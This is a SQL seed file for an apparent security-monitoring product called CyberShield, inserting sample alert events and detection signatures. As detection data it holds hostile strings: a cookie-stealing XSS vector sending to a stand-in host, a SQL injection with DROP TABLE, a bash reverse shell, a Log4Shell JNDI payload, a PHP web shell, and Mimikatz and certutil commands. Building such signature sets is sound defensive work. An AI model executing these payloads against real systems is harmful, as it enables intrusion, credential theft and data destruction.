-- CyberShield Initial Seed Data

-- 20 Sample Security Events
INSERT INTO security_events (event_id, source, severity, type, description, raw_data, timestamp, created_at)
VALUES
('EVT-1001', 'FW-EXTERNAL-01', 'CRITICAL', 'INTRUSION_ATTEMPT', 'Port scan and SYN flood from untrusted external subnet', '{"src_ip":"198.51.100.42","dst_ip":"10.0.1.15","dst_port":443,"packet_count":24000}', NOW() - INTERVAL '2 hour', NOW()),
('EVT-1002', 'EDR-WORKSTATION-44', 'HIGH', 'MALWARE_DETECTED', 'Malicious dropper script observed creating suspicious child process', '{"process":"powershell.exe","cmdline":"-enc SUVYKE5ldy1PYmplY3Q...","user":"jdoe"}', NOW() - INTERVAL '3 hour', NOW()),
('EVT-1003', 'IAM-GATEWAY', 'MEDIUM', 'POLICY_VIOLATION', 'Access attempt to financial datastore outside designated business hours', '{"user":"mallen","role":"analyst","resource":"s3://cybershield-finance-lake"}', NOW() - INTERVAL '4 hour', NOW()),
('EVT-1004', 'NET-NDR-PROBE-02', 'HIGH', 'ANOMALY', 'High volume anomalous outbound encrypted session to untrusted VPS', '{"src_ip":"10.0.2.88","dst_ip":"203.0.113.77","bytes_sent":184200000,"duration_sec":420}', NOW() - INTERVAL '5 hour', NOW()),
('EVT-1005', 'AUTH-SSO-SERVER', 'MEDIUM', 'AUTH_FAILURE', 'Multiple consecutive failed MFA token challenges detected', '{"user":"service-deployer","attempt_count":6,"src_ip":"192.0.2.14"}', NOW() - INTERVAL '6 hour', NOW()),
('EVT-1006', 'WAF-EDGE-01', 'HIGH', 'INTRUSION_ATTEMPT', 'SQL injection attack detected in HTTP POST body payload', '{"url":"/api/v1/auth/login","payload":"admin'' OR ''1''=''1; DROP TABLE users;--","client":"curl/7.88"}', NOW() - INTERVAL '7 hour', NOW()),
('EVT-1007', 'EDR-SERVER-09', 'CRITICAL', 'MALWARE_DETECTED', 'EICAR test string found inside staging payload directory', '{"path":"/opt/uploads/staging/test_virus.com","hash":"44d88612fea8a8f36de82e1278abb02f"}', NOW() - INTERVAL '8 hour', NOW()),
('EVT-1008', 'DLP-AGENT-77', 'HIGH', 'POLICY_VIOLATION', 'Unencrypted credit card sequence detected in outgoing SMTP message body', '{"recipient":"vendor@external-partner.com","pattern_matched":"PAN_VISA"}', NOW() - INTERVAL '9 hour', NOW()),
('EVT-1009', 'NET-ZEEK-MONITOR', 'MEDIUM', 'ANOMALY', 'Unusual DNS tunneling query pattern with high Shannon entropy', '{"domain":"a8f37bc01.tunnel.c2domain.net","query_type":"TXT","entropy":4.82}', NOW() - INTERVAL '10 hour', NOW()),
('EVT-1010', 'LDAP-CONTROLLER-01', 'HIGH', 'AUTH_FAILURE', 'Kerberoasting behavior detected: mass SPN ticket requests', '{"account":"svc_sql_prod","tickets_requested":48,"client_host":"WS-ENG-12"}', NOW() - INTERVAL '11 hour', NOW()),
('EVT-1011', 'WAF-EDGE-02', 'CRITICAL', 'INTRUSION_ATTEMPT', 'Path traversal attempt targeting sensitive UNIX credentials file', '{"path":"/view?file=../../../../../../etc/passwd","status":403}', NOW() - INTERVAL '12 hour', NOW()),
('EVT-1012', 'EDR-WORKSTATION-19', 'CRITICAL', 'MALWARE_DETECTED', 'Cobalt Strike beacon reflective loader pattern identified in memory', '{"pid":3812,"injected_dll":"beacon.dll","c2_pipe":"\\\\.\\pipe\\msagent_1a"}', NOW() - INTERVAL '13 hour', NOW()),
('EVT-1013', 'VPN-CONCENTRATOR', 'LOW', 'POLICY_VIOLATION', 'Simultaneous geo-impossible logins within 5 minutes', '{"locations":["New York, US", "Tokyo, JP"],"user":"kpatel"}', NOW() - INTERVAL '14 hour', NOW()),
('EVT-1014', 'NET-FLOW-ANALYST', 'MEDIUM', 'ANOMALY', 'Spike in internal SMB lateral traffic across production DMZ boundaries', '{"subnet":"10.0.5.0/24","bytes_per_sec":85000000,"port":445}', NOW() - INTERVAL '15 hour', NOW()),
('EVT-1015', 'AUTH-RADIUS-01', 'MEDIUM', 'AUTH_FAILURE', 'Repeated 802.1x wireless authentication handshake failures', '{"mac":"b4:2e:99:31:ac:05","ap":"AP-FLOOR-3-EAST","count":12}', NOW() - INTERVAL '16 hour', NOW()),
('EVT-1016', 'WAF-EDGE-01', 'HIGH', 'INTRUSION_ATTEMPT', 'Stored Cross-Site Scripting (XSS) payload submitted in profile update', '{"field":"bio","vector":"<script>document.location=''http://c2.evil/c=''+document.cookie</script>"}', NOW() - INTERVAL '17 hour', NOW()),
('EVT-1017', 'EDR-WORKSTATION-91', 'HIGH', 'MALWARE_DETECTED', 'Ransomware extension rename sequence initiated in Documents folder', '{"renamed_count":130,"ext":".locked_crypt","trigger_file":"invoice_2026.pdf.exe"}', NOW() - INTERVAL '18 hour', NOW()),
('EVT-1018', 'GITLAB-AUDIT-LOG', 'MEDIUM', 'POLICY_VIOLATION', 'High entropy AWS secret access key committed to public repository branch', '{"repo":"cybershield/frontend","commit":"f38ac91","token_prefix":"AKIAIOSFODNN7"}', NOW() - INTERVAL '19 hour', NOW()),
('EVT-1019', 'FLOW-SFLOW-CORE', 'LOW', 'ANOMALY', 'Unusual ICMP echo reply size exceeding standard MTU baseline', '{"payload_size":1480,"src_ip":"10.10.20.5","frequency":"100pps"}', NOW() - INTERVAL '20 hour', NOW()),
('EVT-1020', 'AZURE-AD-IDENTITY', 'HIGH', 'AUTH_FAILURE', 'Password spray pattern observed against 140 enterprise user accounts', '{"user_agent":"python-requests/2.31","attempts":140,"unique_ips":8}', NOW() - INTERVAL '21 hour', NOW())
ON CONFLICT (event_id) DO NOTHING;

-- 15 Threat Signatures
INSERT INTO threat_signatures (signature_id, name, pattern, category, severity, description, created_at)
VALUES
('SIG-2001', 'EICAR Standard Antivirus Test', 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*', 'MALWARE', 'CRITICAL', 'Industry-standard European Institute for Computer Antivirus Research test string', NOW()),
('SIG-2002', 'SQL Injection Tautology', ''' OR ''1''=''1', 'SQL_INJECTION', 'CRITICAL', 'Classic authentication bypass tautology used in SQL injection exploits', NOW()),
('SIG-2003', 'SQL Union Select Probe', 'UNION ALL SELECT NULL, NULL', 'SQL_INJECTION', 'HIGH', 'Column enumeration probe payload commonly utilized in SQL injection', NOW()),
('SIG-2004', 'Basic Script Tag XSS', '<script>alert(1)</script>', 'XSS', 'HIGH', 'Proof-of-concept cross-site scripting attack vector executing JavaScript alert', NOW()),
('SIG-2005', 'Image Onerror XSS Vector', '<img src=x onerror=alert(document.cookie)>', 'XSS', 'HIGH', 'Event-handler based XSS pattern evading standard element filters', NOW()),
('SIG-2006', 'UNIX Path Traversal Passwd', '../../../../etc/passwd', 'PATH_TRAVERSAL', 'CRITICAL', 'Relative path traversal pattern attempting retrieval of local unix user database', NOW()),
('SIG-2007', 'Windows SYSTEM32 Traversal', '..\..\Windows\System32\drivers\etc\hosts', 'PATH_TRAVERSAL', 'HIGH', 'Windows directory traversal seeking static DNS resolution map', NOW()),
('SIG-2008', 'Log4Shell JNDI Injection', '${jndi:ldap://attacker-c2.net:1389/Exploit}', 'REMOTE_CODE_EXECUTION', 'CRITICAL', 'Apache Log4j CVE-2021-44228 JNDI string interpolation exploit', NOW()),
('SIG-2009', 'Bash Reverse Shell One-Liner', '/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'SHELLCODE', 'CRITICAL', 'Interactive bash reverse TCP shell redirection payload', NOW()),
('SIG-2010', 'PowerShell Encoded Command Flag', 'powershell.exe -NoP -NonI -W Hidden -Enc', 'MALWARE_DROPPER', 'HIGH', 'Stealth base64 encoded PowerShell execution command switch profile', NOW()),
('SIG-2011', 'Mimikatz Sekurlsa String', 'sekurlsa::logonpasswords', 'CREDENTIAL_DUMPING', 'CRITICAL', 'Standard Mimikatz command sequence used to extract LSASS memory secrets', NOW()),
('SIG-2012', 'Spring4Shell ClassLoader Vector', 'class.module.classLoader.resources.context', 'REMOTE_CODE_EXECUTION', 'CRITICAL', 'CVE-2022-22965 Spring Framework DataBinder remote code execution vector', NOW()),
('SIG-2013', 'PHP Web Shell Command Eval', '<?php @eval($_POST[''cmd'']); ?>', 'WEBSHELL', 'CRITICAL', 'Minimalist single-line PHP evaluation web backdoor shell', NOW()),
('SIG-2014', 'Certutil Remote Payload Fetch', 'certutil.exe -urlcache -split -f http://', 'LIVING_OFF_THE_LAND', 'MEDIUM', 'Living-off-the-land binary (LOLBin) certificate utility used for malware download', NOW()),
('SIG-2015', 'SSH Private Key Header Match', '-----BEGIN OPENSSH PRIVATE KEY-----', 'DATA_EXFILTRATION', 'CRITICAL', 'Unencrypted OpenSSH cryptographic private key material header', NOW())
ON CONFLICT (signature_id) DO NOTHING;
